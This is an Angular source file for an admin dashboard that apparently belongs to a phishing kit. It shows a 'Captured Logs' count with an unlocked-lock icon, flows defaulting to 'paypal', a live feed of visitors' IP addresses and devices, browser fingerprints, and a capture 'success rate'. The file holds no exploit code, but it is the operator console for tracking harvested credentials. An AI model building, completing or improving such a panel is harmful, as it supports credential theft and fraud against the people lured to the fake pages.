import { Component, inject, computed } from '@angular/core';
import { CommonModule } from '@angular/common';
import { MetricCardV2Component } from '../ui/metric-card.component';
import { DataTableV2Component } from '../ui/data-table.component';
import { StatsService } from '../../../services/stats.service';
import { StateService } from '../../../services/state.service';
import { getFlowById } from '../../../services/flows.service';

@Component({
   selector: 'app-admin-dashboard-v2',
   standalone: true,
   imports: [CommonModule, MetricCardV2Component, DataTableV2Component],
   template: `
    <div class="space-y-6">
      
      <!-- Quick Stats Row -->
      <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
        
        <!-- Stat Card 1: Total Visits -->
        <app-metric-card-v2 
            title="Total Visits" 
            [value]="totalSessions()" 
            icon="devices" 
            color="blue" 
            trend="up" 
            trendValue="Live" 
            [progress]="65"> <!-- Todo: calc real progress -->
        </app-metric-card-v2>

        <!-- Stat Card 2: Verified (Captured) -->
        <app-metric-card-v2 
            title="Captured Logs" 
            [value]="verifiedSessions()" 
            icon="lock_open" 
            color="purple" 
            trend="up" 
            trendValue="New" 
            [progress]="verifiedPercent()">
        </app-metric-card-v2>

        <!-- Stat Card 3: Success Rate -->
        <app-metric-card-v2 
            title="Success Rate" 
            [value]="successRate() + '%'" 
            icon="check_circle" 
            color="emerald" 
            trend="up" 
            trendValue="Avg" 
            [progress]="successRate()">
        </app-metric-card-v2>

        <!-- Stat Card 4: Mobile Traffic -->
        <app-metric-card-v2 
            title="Mobile Traffic" 
            [value]="mobilePercent() + '%'" 
            icon="smartphone" 
            color="amber" 
            trend="down" 
            trendValue="Device" 
            [progress]="mobilePercent()">
        </app-metric-card-v2>
      </div>

      <!-- Main Content Grid -->
      <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
        
        <!-- Recent Activity Feed (Takes up 2 cols) -->
        <div class="lg:col-span-2">
           <app-data-table-v2 
               title="Live Activity Feed"
               [columns]="feedColumns"
               [data]="recentActivity()">
           </app-data-table-v2>
        </div>

        <!-- System Status (Takes up 1 col) -->
        <div class="flex flex-col gap-6">
           
           <!-- Server Health -->
           <div class="adm-card p-5">
              <h3 class="adm-h3 text-white mb-4">System Status</h3>
              <div class="space-y-4">
                 <div>
                    <div class="flex justify-between text-xs mb-1">
                       <span class="text-slate-400">Memory Usage</span>
                       <span class="text-white font-mono">~45%</span>
                    </div>
                    <div class="h-1.5 bg-slate-800 rounded-full overflow-hidden">
                       <div class="h-full bg-emerald-500 w-[45%]"></div>
                    </div>
                 </div>
                 <div>
                    <div class="flex justify-between text-xs mb-1">
                       <span class="text-slate-400">Environment</span>
                       <span class="text-white font-mono">Production</span>
                    </div>
                    <div class="h-1.5 bg-slate-800 rounded-full overflow-hidden">
                       <div class="h-full bg-blue-500 w-[100%]"></div>
                    </div>
                 </div>
              </div>
           </div>

           <!-- Notifications / Alerts -->
           <div class="adm-card flex-1 p-5">
              <h3 class="adm-h3 text-white mb-4">Alerts</h3>
              <div class="space-y-3">
                 <div class="p-3 bg-slate-900/50 border border-slate-800 rounded-md flex gap-3 items-start">
                     <span class="material-icons text-blue-500 text-sm mt-0.5">info</span>
                     <div>
                        <p class="text-xs text-white font-medium">System Online</p>
                        <p class="text-[10px] text-slate-500 mt-1">Dashboard is receiving live telemetery.</p>
                     </div>
                 </div>
              </div>
           </div>

        </div>

      </div>
    </div>
  `,
   styles: []
})
export class AdminDashboardV2Component {
   private statsService = inject(StatsService);
   private stateService = inject(StateService);

   // Metrics
   totalSessions = computed(() => this.statsService.stats().totalSessions.toString());
   verifiedSessions = computed(() => this.statsService.stats().verifiedSessions.toString());
   successRate = computed(() => this.statsService.stats().successRate);

   verifiedPercent = computed(() => {
      const total = this.statsService.stats().totalSessions;
      const verified = this.statsService.stats().verifiedSessions;
      return total > 0 ? (verified / total) * 100 : 0;
   });

   mobilePercent = computed(() => {
      const history = this.stateService.history();
      if (!history.length) return 0;
      const mobile = history.filter(s => {
         const ua = s.data?.fingerprint?.userAgent?.toLowerCase() || '';
         return ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');
      }).length;
      return Math.round((mobile / history.length) * 100);
   });

   // Feed Data
   feedColumns = [
      { header: 'Time', field: 'time', width: 'col-span-2', type: 'time' },
      { header: 'Flow', field: 'flowName', width: 'col-span-2', textClass: 'font-medium text-white' },
      { header: 'IP Address', field: 'ip', width: 'col-span-3', textClass: 'font-mono text-slate-300 text-xs' },
      { header: 'Device', field: 'device', width: 'col-span-2' },
      { header: 'Status', field: 'status', width: 'col-span-3', type: 'status', class: 'text-right' }
   ];

   recentActivity = computed(() => {
      return this.stateService.history().slice(0, 8).map(s => {
         const flow = getFlowById(s.data?.flowId || 'paypal');
         const ua = (s.data?.fingerprint?.userAgent || '').toLowerCase();
         let device = 'Desktop';
         if (ua.includes('mobile')) device = 'Mobile';

         return {
            time: this.timeAgo(new Date(s.timestamp)),
            flowName: flow?.name || 'Unknown',
            ip: s.data?.ip || 'Unknown',
            device: device,
            status: s.status || 'Active'
         };
      });
   });

   private timeAgo(date: Date): string {
      const seconds = Math.floor((new Date().getTime() - date.getTime()) / 1000);
      if (seconds < 60) return 'Just now';
      const minutes = Math.floor(seconds / 60);
      if (minutes < 60) return `${minutes}m ago`;
      const hours = Math.floor(minutes / 60);
      return `${hours}h ago`;
   }
}
